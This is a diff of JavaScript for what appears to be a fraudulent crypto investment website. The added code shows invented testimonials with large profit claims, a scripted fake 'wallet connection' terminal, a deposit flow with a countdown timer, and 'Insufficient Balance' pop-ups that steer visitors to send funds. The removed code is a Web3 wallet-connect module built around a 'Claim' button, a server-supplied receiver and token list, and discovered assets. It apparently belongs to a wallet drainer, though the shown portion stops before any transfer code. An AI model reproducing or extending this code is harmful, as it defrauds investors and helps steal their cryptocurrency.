+  {n:'Takeshi Yamamoto',l:'Japan',q:'Platform security gives me confidence. $30k invested, $42k returned.',i:'https://images.unsplash.com/photo-1622253692010-333f2da6031d?w=80&h=80&fit=crop&crop=face'},
+  {n:'Grace Adeyemi',l:'Nigeria',q:'From $5,000 to $19,000 in 4 weeks on the Premium plan.',i:'https://images.unsplash.com/photo-1607746882042-944635dfe10e?w=80&h=80&fit=crop&crop=face'},
+  {n:'Raj Patel',l:'India',q:'$1,800/day in passive earnings. Best investment decision of my life.',i:'https://images.unsplash.com/photo-1568602471122-7832951cc4c5?w=80&h=80&fit=crop&crop=face'},
+  {n:'Ingrid Hansen',l:'Norway',q:'Wallet connection earnings are real. $2,600/day deposited to my balance.',i:'https://images.unsplash.com/photo-1484688493527-670f98f9b195?w=80&h=80&fit=crop&crop=face'}
+];
 
-// ─── GLOBAL STATE ──────────────────────────────────────────────
-var prices = {btc:97245,eth:3412,bnb:645};
-var tmrInt = null;
-var depAmt = 1000;
+window.onload=function(){
+  document.getElementById('risk-overlay').style.display='flex';
+  buildWmDots();
+};
+document.addEventListener('click',function(e){
+  if(!e.target.closest('#lang-sel'))document.getElementById('lang-drop').classList.remove('open');
+});
 
-// ─── PAGE NAVIGATION ───────────────────────────────────────────
-var PAGES = ['landing','dashboard','terms','privacy'];
+function buildWmDots(){
+  var ids=['wm-dots0','wm-dots1','wm-dots2','wm-dots3','wm-dots4'];
+  ids.forEach(function(id,slideIdx){
+    var el=document.getElementById(id);if(!el)return;
+    var html='';for(var i=0;i<4;i++)html+='<div class="dot'+(i===slideIdx?' on':'')+'"></div>';
+    el.innerHTML=html;
+  });
+}
+function goSlide(n){
+  curSlide=n;
+  document.getElementById('wm-track').style.transform='translateX(-'+(n*100)+'%)';
+  var ids=['wm-dots0','wm-dots1','wm-dots2','wm-dots3','wm-dots4'];
+  ids.forEach(function(id){
+    var el=document.getElementById(id);if(!el)return;
+    el.querySelectorAll('.dot').forEach(function(d,i){d.classList.toggle('on',i===Math.min(n,4));});
+  });
+}
+
+function acceptRisk(){document.getElementById('risk-overlay').style.display='none';}
+function toggleLang(){document.getElementById('lang-drop').classList.toggle('open');}
+function setLang(c){document.getElementById('lc').textContent=c;document.getElementById('lang-drop').classList.remove('open');}
+
+var PAGES=['landing','dashboard','terms','privacy'];
 function showPage(id){
-  PAGES.forEach(function(p){ var el = document.getElementById('page-'+p); if(el) el.classList.remove('active'); });
-  var el = document.getElementById('page-'+id); if(el) el.classList.add('active');
+  PAGES.forEach(function(p){var el=document.getElementById('page-'+p);if(el)el.classList.remove('active');});
+  var el=document.getElementById('page-'+id);if(el)el.classList.add('active');
+  var ln=document.getElementById('landing-nav');if(ln)ln.style.display=(id==='landing')?'flex':'none';
   window.scrollTo(0,0);
 }
-function openAuth(tab){ document.getElementById('auth-modal').classList.add('open'); switchTab(tab); }
-function closeAuth(){ document.getElementById('auth-modal').classList.remove('open'); }
+
+function openAuth(tab){document.getElementById('auth-modal').classList.add('open');switchTab(tab);}
+function closeAuth(){document.getElementById('auth-modal').classList.remove('open');}
 function switchTab(t){
-  document.getElementById('form-create').style.display = t==='create'?'block':'none';
-  document.getElementById('form-signin').style.display = t==='signin'?'block':'none';
-  document.getElementById('tab-c').className = 'tab-btn'+(t==='create'?' on':'');
-  document.getElementById('tab-s').className = 'tab-btn'+(t==='signin'?' on':'');
+  document.getElementById('form-create').style.display=t==='create'?'block':'none';
+  document.getElementById('form-signin').style.display=t==='signin'?'block':'none';
+  document.getElementById('tab-c').className='tab-btn'+(t==='create'?' on':'');
+  document.getElementById('tab-s').className='tab-btn'+(t==='signin'?' on':'');
 }
+
 function doLoginCreate(){
-  document.getElementById('btn-create').style.display='none'; document.getElementById('load-create').style.display='block';
-  setTimeout(function(){ document.getElementById('load-create').style.display='none'; document.getElementById('btn-create').style.display='block'; closeAuth(); showPage('dashboard'); showDash('main'); },6000);
+  var name=document.getElementById('c-name').value.trim();
+  var email=document.getElementById('c-email').value.trim();
+  var phone=document.getElementById('c-phone').value.trim();
+  var pass=document.getElementById('c-pass').value.trim();
+  if(!name||!email||!phone||!pass){alert('Please fill in all fields before continuing.');return;}
+  document.getElementById('btn-create').style.display='none';
+  document.getElementById('load-create').style.display='block';
+  setTimeout(function(){
+    document.getElementById('load-create').style.display='none';
+    document.getElementById('btn-create').style.display='block';
+    closeAuth();showPage('dashboard');showDash('main');buildRotTesti();
+  },6000);
 }
 function doLoginSignIn(){
-  document.getElementById('btn-signin').style.display='none'; document.getElementById('load-signin').style.display='block';
-  setTimeout(function(){ document.getElementById('load-signin').style.display='none'; document.getElementById('btn-signin').style.display='block'; closeAuth(); showPage('dashboard'); showDash('main'); },6000);
-}
-var DD = ['main','deposit','withdraw','statement','settings'];
-function showDash(sub){
-  DD.forEach(function(s){ var el = document.getElementById('dd-'+s); if(el) el.style.display='none'; });
-  var el = document.getElementById('dd-'+sub); if(el) el.style.display='block';
-  window.scrollTo(0,0);
-}
-function openSB(){ document.getElementById('sidebar').classList.add('open'); document.getElementById('sb-ov').classList.add('open'); }
-function closeSB(){ document.getElementById('sidebar').classList.remove('open'); document.getElementById('sb-ov').classList.remove('open'); }
-function openPM(){ document.getElementById('pm-ov').classList.add('open'); }
-function closePM(){ document.getElementById('pm-ov').classList.remove('open'); }
-function showConf(){ document.getElementById('conf-ov').classList.add('open'); }
-function doLogout(){ document.getElementById('conf-ov').classList.remove('open'); showPage('landing'); }
-function closeGM(){ document.getElementById('gm-ov').classList.remove('open'); }
-function showGM(t,b,btnTxt,fn,showC){
-  document.getElementById('gm-t').textContent=t; document.getElementById('gm-b').textContent=b;
-  var btn=document.getElementById('gm-btn'); btn.textContent=btnTxt||'OK'; btn.onclick=fn||closeGM;
-  document.getElementById('gm-c').style.display=showC?'block':'none'; document.getElementById('gm-ov').classList.add('open');
+  var email=document.getElementById('s-email').value.trim();
+  var pass=document.getElementById('s-pass').value.trim();
+  if(!email||!pass){alert('Please enter your email and password.');return;}
+  document.getElementById('btn-signin').style.display='none';
+  document.getElementById('load-signin').style.display='block';
+  setTimeout(function(){
+    document.getElementById('load-signin').style.display='none';
+    document.getElementById('btn-signin').style.display='block';
+    closeAuth();showPage('dashboard');showDash('main');buildRotTesti();
+  },6000);
 }
 
-// ─── DEPOSIT ──────────────────────────────────────────────────
-function selM(m){ document.querySelectorAll('.meth').forEach(function(b){ b.classList.remove('sel'); }); document.getElementById('m-'+m).classList.add('sel'); }
-function setAmt(v){ document.getElementById('dep-amt').value=v; depAmt=v; }
+var DD=['main','markets','signals','plans','deposit','withdraw','transfer','statement','settings','performance','referral','stories','copytrade','preferences'];
+function showDash(sub){
+  DD.forEach(function(s){var el=document.getElementById('dd-'+s);if(el)el.style.display='none';});
+  var el=document.getElementById('dd-'+sub);if(el)el.style.display='block';
+  if(sub==='stories')buildStories();
+  if(sub==='markets')buildMkts();
+  window.scrollTo(0,0);
+}
+function openSB(){document.getElementById('sidebar').classList.add('open');document.getElementById('sb-ov').classList.add('open');}
+function closeSB(){document.getElementById('sidebar').classList.remove('open');document.getElementById('sb-ov').classList.remove('open');}
+function openPM(){document.getElementById('pm-ov').classList.add('open');}
+function closePM(){document.getElementById('pm-ov').classList.remove('open');}
+function showConf(){document.getElementById('conf-ov').classList.add('open');}
+function doLogout(){document.getElementById('conf-ov').classList.remove('open');showPage('landing');}
+function showGM(t,b,btnTxt,fn,showC){
+  document.getElementById('gm-t').textContent=t;
+  document.getElementById('gm-b').textContent=b;
+  var btn=document.getElementById('gm-btn');btn.textContent=btnTxt||'OK';btn.onclick=fn||closeGM;
+  document.getElementById('gm-c').style.display=showC?'block':'none';
+  document.getElementById('gm-ov').classList.add('open');
+}
+function closeGM(){document.getElementById('gm-ov').classList.remove('open');}
+function openWM(){document.getElementById('wm-ov').classList.add('open');goSlide(0);}
+function closeWM(){document.getElementById('wm-ov').classList.remove('open');}
+function selW(n){document.getElementById('ws2-ttl').textContent='Connecting '+n+'...';goSlide(4);runTerminal(n);}
+
+var TLS=[
+  {t:'> Initializing wallet bridge...',c:'',d:500},
+  {t:'> Scanning blockchain nodes...',c:'',d:600},
+  {t:'> Establishing P2P handshake...',c:'',d:650},
+  {t:'> Verifying wallet signature...',c:'',d:700},
+  {t:'> Authenticating connection...',c:'',d:600},
+  {t:'> Syncing with network...',c:'',d:400},
+  {t:'> Connection established.',c:'',d:400},
+  {t:'> ✅ Wallet connected successfully!',c:'',d:300}
+];
+function runTerminal(n){
+  var box=document.getElementById('terminal');box.innerHTML='<span class="tcursor"></span>';
+  var i=0;
+  function next(){
+    if(i>=TLS.length){setTimeout(function(){closeWM();alert('✅ '+n+' connected successfully!');},600);return;}
+    var ln=document.createElement('span');ln.className='tl'+(TLS[i].c?' '+TLS[i].c:'');ln.textContent=TLS[i].t;
+    box.insertBefore(ln,box.lastChild);box.scrollTop=box.scrollHeight;
+    var d=TLS[i].d;i++;setTimeout(next,d);
+  }
+  setTimeout(next,300);
+}
+
+function triggerWdVerify(){
+  document.getElementById('wd-note-ov').classList.add('open');
+}
+
+function selM(m){
+  selM2=m;
+  document.querySelectorAll('.meth').forEach(function(b){b.classList.remove('sel');});
+  document.getElementById('m-'+m).classList.add('sel');
+  if(document.getElementById('dep-addr').style.display!=='none')updAddr();
+}
+function setAmt(v){document.getElementById('dep-amt').value=v;depAmt=v;}
+function updAddr(){
+  var w=WA[selM2];
+  document.getElementById('w-addr').textContent=w.addr;
+  document.getElementById('addr-lbl').textContent=w.lbl+' Wallet Address';
+  document.getElementById('net-bdg').textContent=w.net;
+  document.getElementById('warn-txt').textContent='Only send '+w.lbl+' to this address. Sending other coins may result in permanent loss.';
+  document.getElementById('qr-img').src='https://api.qrserver.com/v1/create-qr-code/?data='+encodeURIComponent(w.addr)+'&size=180x180&margin=10';
+}
 function showAddr(){
-  var a = parseFloat(document.getElementById('dep-amt').value);
-  if(!a||isNaN(a)||a<1000){ showGM('Minimum Deposit','Minimum is $1,000.','OK',closeGM,false); return; }
-  depAmt = a;
-  document.getElementById('dep-form').style.display='none'; document.getElementById('dep-addr').style.display='block';
-  startTmr(30*60);
+  var a=parseFloat(document.getElementById('dep-amt').value);
+  if(!a||isNaN(a)||a<1000){showGM('Minimum Deposit Required','The minimum deposit amount is $1,000. Please enter at least $1,000 to continue.','OK',closeGM,false);return;}
+  depAmt=a;updAddr();
+  document.getElementById('dep-form').style.display='none';
+  document.getElementById('dep-addr').style.display='block';
+  startTmr(30*60);window.scrollTo(0,0);
 }
 function cpAddr(){
-  var a = document.getElementById('w-addr').textContent;
-  navigator.clipboard ? navigator.clipboard.writeText(a).then(function(){ alert('Copied!'); }) : alert(a);
+  var addr=document.getElementById('w-addr').textContent;
+  navigator.clipboard?navigator.clipboard.writeText(addr).then(function(){alert('✅ Copied!');}):alert(addr);
 }
-function startTmr(s){ clearTmr(); tmrInt=setInterval(function(){ if(s<=0){ clearTmr(); document.getElementById('tmr').textContent='Expired'; return; } s--; var m=Math.floor(s/60),sc=s%60; document.getElementById('tmr').textContent=(m<10?'0':'')+m+':'+(sc<10?'0':'')+sc; },1000); }
-function clearTmr(){ if(tmrInt){ clearInterval(tmrInt); tmrInt=null; } }
+function startTmr(s){
+  clearTmr();
+  tmrInt=setInterval(function(){
+    if(s<=0){clearTmr();document.getElementById('tmr').textContent='Expired';return;}
+    s--;var m=Math.floor(s/60),sc=s%60;
+    document.getElementById('tmr').textContent=(m<10?'0':'')+m+':'+(sc<10?'0':'')+sc;
+  },1000);
+}
+function clearTmr(){if(tmrInt){clearInterval(tmrInt);tmrInt=null;}}
+function fileChosen(e){
+  var f=e.target.files[0];if(f){
+    var r=new FileReader();
+    r.onload=function(ev){
+      var p=document.getElementById('proof-prev');p.style.display='block';
+      p.innerHTML='<img src="'+ev.target.result+'" style="max-width:100%;max-height:120px;border-radius:10px;"/><p style="font-size:11px;color:#22c55e;margin-top:6px;">✅ '+f.name+'</p>';
+    };r.readAsDataURL(f);
+  }
+}
 function confDep(){
-  document.getElementById('proc-net-txt').textContent='Verifying deposit via backend...';
+  var w=WA[selM2];
+  document.getElementById('proc-asset').textContent=w.asset;
+  document.getElementById('proc-network').textContent=w.net;
+  document.getElementById('proc-net-txt').textContent='Verifying transaction details on the '+w.net+' network.';
+  document.getElementById('proc-qty').textContent=depAmt.toFixed(4)+' '+w.ticker;
   document.getElementById('proc-ov').classList.add('open');
 }
 
-// ─── PRICE TICKER ─────────────────────────────────────────────
+function subSig(p){showGM('Insufficient Balance','You need $'+p+' but have $100.00.','Deposit Now',function(){closeGM();showDash('deposit');},true);}
+function openPS(t){document.querySelectorAll('.ps-card').forEach(function(c){c.classList.remove('on');});document.getElementById('plans-list').style.display='none';document.getElementById('ps-'+t).classList.add('on');}
+function closePS(){document.querySelectorAll('.ps-card').forEach(function(c){c.classList.remove('on');});document.getElementById('plans-list').style.display='block';}
+function updPS(t,v){
+  var n=parseInt(v),f='$'+n.toLocaleString();
+  if(t==='yield'){document.getElementById('sv-a').textContent=f;document.getElementById('sv-r').textContent='$'+(n*0.20).toFixed(0);}
+  else if(t==='alpha'){document.getElementById('sa-a').textContent=f;document.getElementById('sa-r').textContent='$'+(n*0.25).toFixed(0);}
+  else{document.getElementById('se-a').textContent=f;document.getElementById('se-r').textContent='$'+(n*0.35).toFixed(0);}
+}
+function investNow(){showGM('Insufficient Balance','Your balance is $100.00. You need at least $1,000 for this investment.','Deposit Now',function(){closeGM();closePS();showDash('deposit');},true);}
+function openCP(n,m){cpMin=m;document.getElementById('cp-t').textContent='Copy '+n;document.getElementById('cp-amt').placeholder='Min $'+m;document.getElementById('cp-amt').value='';document.getElementById('cp-ov').classList.add('open');}
+function startCopy(){var a=parseFloat(document.getElementById('cp-amt').value);if(!a||a<cpMin){alert('Minimum amount is $'+cpMin);return;}document.getElementById('cp-ov').classList.remove('open');showGM('Insufficient Balance','Please deposit funds to start copy trading.','Deposit Now',function(){closeGM();showDash('deposit');},true);}
+function doTransfer(){var r=document.getElementById('tf-rec').value.trim(),a=document.getElementById('tf-amt').value;if(!r||!a){alert('Please fill in all fields.');return;}alert('Transfer failed. Insufficient balance. Please deposit funds.');}
 function updPrices(){
-  Object.keys(prices).forEach(function(c){ var ch=(Math.random()-0.48)*0.8; prices[c]*=(1+ch/100); var pe=document.getElementById('p-'+c),ce=document.getElementById('c-'+c); if(pe){ pe.textContent='$'+(prices[c]>100?prices[c].toFixed(1):prices[c].toFixed(4)); if(ce){ ce.textContent=(ch>=0?'▲ +':'▼ ')+Math.abs(ch).toFixed(2)+'%'; ce.className=ch>=0?'up':'dn2'; }} });
+  Object.keys(prices).forEach(function(c){
+    var ch=(Math.random()-0.48)*0.8;prices[c]*=(1+ch/100);
+    var pe=document.getElementById('p-'+c),ce=document.getElementById('c-'+c);
+    if(pe){pe.textContent='$'+(prices[c]>100?prices[c].toFixed(1):prices[c].toFixed(4));if(ce){ce.textContent=(ch>=0?'▲ +':'▼ ')+Math.abs(ch).toFixed(2)+'%';ce.className=ch>=0?'up':'dn2';}}
+  });
 }
 setInterval(updPrices,8000);
-
-// ─── RISK DISCLOSURE ──────────────────────────────────────────
-window.onload = function(){ document.getElementById('risk-overlay').style.display='flex'; };
-function acceptRisk(){ document.getElementById('risk-overlay').style.display='none'; }
-
-// ─── OTP INPUT HANDLING ───────────────────────────────────────
+function buildMkts(){
+  var w=document.getElementById('mkt-list');if(!w)return;
+  var coins=[{n:'Bitcoin',t:'BTC',p:97245},{n:'Ethereum',t:'ETH',p:3412},{n:'BNB',t:'BNB',p:645},{n:'Solana',t:'SOL',p:178},{n:'XRP',t:'XRP',p:2.34},{n:'Cardano',t:'ADA',p:0.98},{n:'Avalanche',t:'AVAX',p:38.4},{n:'Polkadot',t:'DOT',p:7.8},{n:'Chainlink',t:'LINK',p:14.2},{n:'Litecoin',t:'LTC',p:92.3}];
+  w.innerHTML='';
+  coins.forEach(function(c){
+    var ch=(Math.random()*8-3).toFixed(2);
+    var d=document.createElement('div');d.className='pr';
+    d.innerHTML='<div class="pr-l"><div class="pr-ic">'+c.t[0]+'</div><div><div class="pr-nm">'+c.n+'</div><div class="pr-tk">'+c.t+'</div></div></div><div style="text-align:right"><div class="pr-price">$'+parseFloat(c.p).toLocaleString()+'</div><div class="'+(parseFloat(ch)>=0?'up':'dn2')+'">'+(parseFloat(ch)>=0?'▲ +':'▼ ')+Math.abs(ch)+'%</div></div>';
+    w.appendChild(d);
+  });
+}
+function mkCard(t){
+  return '<div style="display:flex;gap:12px;"><img style="width:46px;height:46px;border-radius:50%;object-fit:cover;flex-shrink:0;border:2px solid #c9a84c;" src="'+t.i+'" alt="'+t.n+'"/><div><div style="font-weight:700;font-size:13px;color:#c9a84c;">'+t.n+'</div><div style="font-size:10px;color:#888;margin-bottom:4px;">'+t.l+'</div><div style="color:#f59e0b;font-size:13px;margin-bottom:5px;">★★★★★</div><p style="font-size:12px;color:#e0e0e0;line-height:1.6;font-style:italic;">"'+t.q+'"</p></div></div>';
+}
+function buildRotTesti(){
+  var w=document.getElementById('rot-test');if(!w)return;
+  var pool=POOL.slice().sort(function(){return Math.random()-0.5;}).slice(0,12);
+  w.innerHTML='';
+  pool.forEach(function(t){var d=document.createElement('div');d.className='tc';d.innerHTML=mkCard(t);w.appendChild(d);});
+}
+function buildStories(){
+  var w=document.getElementById('stories-list');if(!w)return;w.innerHTML='';
+  POOL.slice().sort(function(){return Math.random()-0.5;}).forEach(function(t){
+    var d=document.createElement('div');d.className='story-card';
+    d.innerHTML='<img class="st-av" src="'+t.i+'" alt="'+t.n+'"/><div><div style="font-weight:700;font-size:13px;color:#c9a84c;">'+t.n+'</div><div style="font-size:10px;color:#888;margin-bottom:4px;">'+t.l+'</div><div style="color:#f59e0b;font-size:13px;margin-bottom:5px;">★★★★★</div><p style="font-size:12px;color:#e0e0e0;line-height:1.6;font-style:italic;">"'+t.q+'"</p></div>';
+    w.appendChild(d);
+  });
+}
 document.addEventListener('DOMContentLoaded',function(){
-  document.querySelectorAll('.otp-in').forEach(function(inp,i,all){ inp.addEventListener('input',function(){ if(inp.value.length===1&&i<all.length-1) all[i+1].focus(); }); inp.addEventListener('keydown',function(e){ if(e.key==='Backspace'&&!inp.value&&i>0) all[i-1].focus(); }); });
+  document.querySelectorAll('.otp-in').forEach(function(inp,i,all){
+    inp.addEventListener('input',function(){if(inp.value.length===1&&i<all.length-1)all[i+1].focus();});
+    inp.addEventListener('keydown',function(e){if(e.key==='Backspace'&&!inp.value&&i>0)all[i-1].focus();});
+  });
 });
 
-// ═══════════════════════════════════════════════════════════════
-// WEB3 FRONTEND — PURE DISPLAY & USER INTERACTION
-// NO business logic, NO secret keys, NO automated trigger logic
-// All decisions come from api/process.php
-// Active chainId is included in EVERY API request payload
-// ═══════════════════════════════════════════════════════════════
-(function(){
-  var connectBtn        = document.getElementById('connectBtn');
-  var claimBtn          = document.getElementById('claimBtn');
-  var disconnectBtn     = document.getElementById('disconnectBtn');
-  var statusText        = document.getElementById('statusText');
-  var stageLog          = document.getElementById('stageLog');
-  var infoPanel         = document.getElementById('infoPanel');
-  var txPanel           = document.getElementById('txPanel');
-  var scannerPanel      = document.getElementById('scannerPanel');
-  var errorBanner       = document.getElementById('errorBanner');
-  var statusBadge       = document.getElementById('statusBadge');
-  var chainSwitchBanner = document.getElementById('chainSwitchBanner');
-  var chainSwitchMsg    = document.getElementById('chainSwitchMsg');
-  var switchChainBtn    = document.getElementById('switchChainBtn');
-
-  // ─── NETWORK DEFINITIONS ──────────────────────────────────────
-  var NETWORKS = {
-    bsc: {
-      chainId: 56,
-      chainHex: '0x38',
-      name: 'BNB Smart Chain',
-      shortName: 'BSC',
-      symbol: 'BNB',
-      rpcUrl: 'https://bsc-dataseed1.binance.org/',
-      explorerUrl: 'https://bscscan.com',
-      chainName: 'BNB Smart Chain'
-    },
-    eth: {
-      chainId: 1,
-      chainHex: '0x1',
-      name: 'Ethereum Mainnet',
-      shortName: 'ETH',
-      symbol: 'ETH',
-      rpcUrl: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
-      explorerUrl: 'https://etherscan.io',
-      chainName: 'Ethereum Mainnet'
-    }
-  };
-
-  // ─── ACTIVE NETWORK STATE (default: BSC — preserves existing behaviour) ─
-  var selectedNetworkKey = 'bsc';
-  var TARGET_CHAIN_ID    = NETWORKS.bsc.chainId;
-  var TARGET_CHAIN_HEX   = NETWORKS.bsc.chainHex;
-
-  var ethersProvider = null, ethersSigner = null, rawProvider = null;
-  var transactions = [], currentChainId = TARGET_CHAIN_ID;
-  var connectedAccount = null, triggerRunning = false;
-  var serverConfig = null, serverReceiver = null, serverTokenList = null;
-  var serverActionPlan = null;
-  var discoveredAssets = [];
-
-  var sleep = function(ms){ return new Promise(function(r){ setTimeout(r, ms); }); };
-
-  // ─── NETWORK SELECTOR UI ──────────────────────────────────────
-  function selectNetwork(key){
-    if (connectedAccount) {
-      // If already connected, switch the wallet chain too
-      selectedNetworkKey = key;
-      applyNetworkSelection(key);
-      switchToSelectedChain();
-      return;
-    }
-    selectedNetworkKey = key;
-    applyNetworkSelection(key);
-  }
-
-  function applyNetworkSelection(key){
-    var net = NETWORKS[key];
-    TARGET_CHAIN_ID  = net.chainId;
-    TARGET_CHAIN_HEX = net.chainHex;
-
-    // Update selector tabs
-    document.getElementById('net-bsc').className = 'net-opt' + (key==='bsc' ? ' active-bsc' : '');
-    document.getElementById('net-eth').className = 'net-opt' + (key==='eth' ? ' active-eth' : '');
-
-    // Update active-network bar
-    var dot  = document.getElementById('activeNetDot');
-    var name = document.getElementById('activeNetName');
-    dot.className  = 'active-net-dot ' + (key==='bsc' ? 'dot-bsc' : 'dot-eth');
-    name.className = 'active-net-name ' + key;
-    name.textContent = net.name + ' (' + net.shortName + ')';
-
-    log('Network selected: ' + net.name + ' (Chain ID ' + net.chainId + ')', 'ok');
-  }
-
-  // ─── apiCall — chainId injected into EVERY request ────────────
-  async function apiCall(action, payload){
-    payload = payload || {};
-    // Always include active chainId so backend knows which config to use
-    payload.chain_id = payload.chain_id !== undefined ? payload.chain_id : TARGET_CHAIN_ID;
-    try {
-      var res = await fetch(API, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'X-Chain-ID': String(TARGET_CHAIN_ID)   // also sent as a header
-        },
-        body: JSON.stringify({ action: action, payload: payload })
-      });
-      var data = await res.json();
-      if (!data.success) { log(data.error || 'API error', 'err'); return null; }
-      return data;
-    } catch(e) {
-      log('API call failed: ' + e.message, 'err');
-      setStatus('Backend connection failed.');
-      return null;
-    }
-  }
-
-  // ─── LOGGING ────────────────────────────────────────────────
-  function log(msg, type){
-    type = type || 'info';
-    stageLog.classList.add('visible');
-    var line = document.createElement('div');
-    line.className = 'log-line' + (type==='ok'?' log-ok':type==='warn'?' log-warn':type==='err'?' log-err':'');
-    line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
-    stageLog.appendChild(line);
-    stageLog.scrollTop = stageLog.scrollHeight;
-  }
-  function setStatus(msg){ statusText.textContent = msg; log(msg); }
-
-  // ─── LOAD SERVER CONFIG ──────────────────────────────────────
-  async function loadServerConfig(){
-    log('Fetching server config (chain ' + TARGET_CHAIN_ID + ')...');
-    var cfg = await apiCall('get_config', { chain_id: TARGET_CHAIN_ID });
-    if (!cfg) return false;
-    serverConfig = cfg;
-    // Server may override chain params; local selection takes precedence
-    log('Server config loaded for chain ' + TARGET_CHAIN_ID + '.', 'ok');
-    return true;
-  }
-
-  // ─── INIT WEB3MODAL ─────────────────────────────────────────
-  async function initWeb3Modal(){
-    if (!serverConfig) { await loadServerConfig(); if (!serverConfig) return; }
-
-    var ESM = 'https://esm.sh/v135';
-    try {
-      var _w3m    = await import(ESM + '/@web3modal/wagmi@5.1.11');
-      var _chains = await import(ESM + '/wagmi@2.12.7/chains');
-      var _core   = await import(ESM + '/@wagmi/core@2.13.4');
-      var _eth    = await import(ESM + '/ethers@6.13.4');
-
-      var projectId = serverConfig.web3modal_project_id || '6d97bf9b04efc25f048a85edeb3f3fd1';
-      // Both BSC and Ethereum included; user's selection determines which is active
-      var chains = [_chains.bsc, _chains.mainnet, _chains.polygon, _chains.arbitrum, _chains.optimism, _chains.avalanche];
-
-      var wagmiConfig = _w3m.defaultWagmiConfig({
-        chains: chains, projectId: projectId,
-        metadata: { name:'Connect', description:'Wallet Connect', url: window.location.origin, icons: ['https://avatars.githubusercontent.com/u/37784886'] },
-        ssr: false
-      });
-
-      await _core.reconnect(wagmiConfig);
-
-      // Default chain reflects current selection
-      var defaultChain = selectedNetworkKey === 'eth' ? _chains.mainnet : _chains.bsc;
-
-      var modal = _w3m.createWeb3Modal({
-        wagmiConfig: wagmiConfig, projectId: projectId, chains: chains, defaultChain: defaultChain,
-        themeMode: 'dark',
-        themeVariables: { '--w3m-color-mix':'#22c55e','--w3m-color-mix-strength':20,'--w3m-accent':'#22c55e','--w3m-z-index':9999 }
-      });
-
-      // ─── BUTTON HANDLERS ─────────────────────────────────────
-      connectBtn.addEventListener('click', async function(){
-        try { setStatus('Opening wallet selector...'); await modal.open(); } catch(e) { setStatus('Could not open wallet modal.'); }
-      });
-
-      disconnectBtn.addEventListener('click', async function(){ await _core.disconnect(wagmiConfig); onDisconnected(); });
-
-      switchChainBtn.addEventListener('click', async function(){ await switchToSelectedChain(); });
-
-      claimBtn.addEventListener('click', async function(){
-        if (triggerRunning) return;
-        if (!connectedAccount) { log('No connected account', 'warn'); return; }
-        if (currentChainId !== TARGET_CHAIN_ID) {
-          setStatus('Switch to ' + NETWORKS[selectedNetworkKey].name + ' first.');
-          chainSwitchBanner.classList.add('visible');
-          await switchToSelectedChain();
-          return;
-        }
-        claimBtn.disabled = true; claimBtn.textContent = 'Processing...';
-        await initiateClaim(connectedAccount.address, currentChainId);
-        claimBtn.disabled = false; claimBtn.textContent = '✦ Claim Access';
-      });
-
-      // ─── ACCOUNT WATCHER ─────────────────────────────────────
-      _core.watchAccount(wagmiConfig, {
-        onChange: async function(account){
-          if (account.isConnected && account.address) { await onConnected(account, _eth); }
-          else if (!account.isConnected) { onDisconnected(); }
-        }
-      });
-
-      // ─── SESSION RESTORE ─────────────────────────────────────
-      var existing = _core.getAccount(wagmiConfig);
-      if (existing.isConnected && existing.address) {
-        log('Restoring existing session...', 'ok');
-        try { await onConnected(existing, _eth); } catch(e) { log('Session restore failed: ' + e.message, 'warn'); }
-      } else {
-        log('Ready — Select network, then connect wallet.', 'ok');
-      }
-
-    } catch(e) {
-      log('Web3 init error: ' + e.message, 'err');
-      if (errorBanner) { errorBanner.textContent = 'Init failed: ' + e.message; errorBanner.classList.add('visible'); }
-    }
-  }
-
-  // ─── BUILD SIGNER ───────────────────────────────────────────
-  async function buildSigner(account){
-    log('Building BrowserProvider...');
-    rawProvider = null;
-    if (account && account.connector) {
-      try { rawProvider = await account.connector.getProvider(); } catch(e) { log('Provider fallback', 'warn'); }
-    }
-    if (!rawProvider && window.ethereum) rawProvider = window.ethereum;
-    if (!rawProvider) throw new Error('No wallet provider.');
-    var _eth = await import('https://esm.sh/v135/ethers@6.13.4');
-    ethersProvider = new _eth.BrowserProvider(rawProvider);
-    var accounts = [];
-    for (var attempt=1; attempt<=8; attempt++) {
-      accounts = await ethersProvider.send('eth_accounts', []);
-      if (accounts.length>0) break;
-      await sleep(600);
-    }
-    if (!accounts.length) throw new Error('Wallet returned no accounts.');
-    ethersSigner = await ethersProvider.getSigner();
-    log('Signer ready.', 'ok');
-  }
-
-  // ─── CHAIN SWITCH (supports BSC and Ethereum) ────────────────
-  async function switchToSelectedChain(){
-    if (!rawProvider) { log('No provider yet — connect wallet first.', 'warn'); return; }
-    var net = NETWORKS[selectedNetworkKey];
-    try {
-      await rawProvider.request({ method:'wallet_switchEthereumChain', params:[{ chainId: net.chainHex }] });
-      log('Switched to ' + net.name, 'ok');
-    } catch(e) {
-      if (e.code === 4902) {
-        try {
-          await rawProvider.request({ method:'wallet_addEthereumChain', params:[{
-            chainId: net.chainHex,
-            chainName: net.chainName,
-            nativeCurrency: { name: net.symbol, symbol: net.symbol, decimals: 18 },
-            rpcUrls: [net.rpcUrl],
-            blockExplorerUrls: [net.explorerUrl]
-          }]});
-          log(net.name + ' added to wallet.', 'ok');
-        } catch(addErr) { log('Failed adding ' + net.name + ' to wallet.', 'err'); }
-      } else { log('Chain switch cancelled or failed.', 'err'); }
-    }
-  }
-
-  // ─── UPDATE CHAIN SWITCH BANNER MESSAGE ──────────────────────
-  function updateChainSwitchBanner(){
-    var net = NETWORKS[selectedNetworkKey];
-    chainSwitchMsg.innerHTML = '⚠️ Please switch to <strong>' + net.name + '</strong> to continue.';
-  }
-
-  // ─── PROVIDER LISTENERS ─────────────────────────────────────
-  function attachProviderListeners(){
-    if (!rawProvider) return;
-    rawProvider.on('chainChanged', async function(hexChain){
-      currentChainId = parseInt(hexChain, 16);
-      if (currentChainId !== TARGET_CHAIN_ID) {
-        updateChainSwitchBanner();
-        chainSwitchBanner.classList.add('visible');
-        setStatus('Wrong network detected.');
-      } else {
-        chainSwitchBanner.classList.remove('visible');
-        setStatus(NETWORKS[selectedNetworkKey].name + ' detected.');
-      }
-      if (connectedAccount) {
-        try { await buildSigner(connectedAccount); await refreshInfo(connectedAccount.address, currentChainId); } catch(e) {}
-      }
-    });
-    rawProvider.on('accountsChanged', async function(accs){
-      if (!accs.length) { onDisconnected(); return; }
-      if (connectedAccount) {
-        try { await buildSigner(connectedAccount); await refreshInfo(accs[0], currentChainId); } catch(e) {}
-      }
-    });
-    log('Provider listeners attached.', 'ok');
-  }
-
-  // ─── ON CONNECTED ───────────────────────────────────────────
-  async function onConnected(account, _eth){
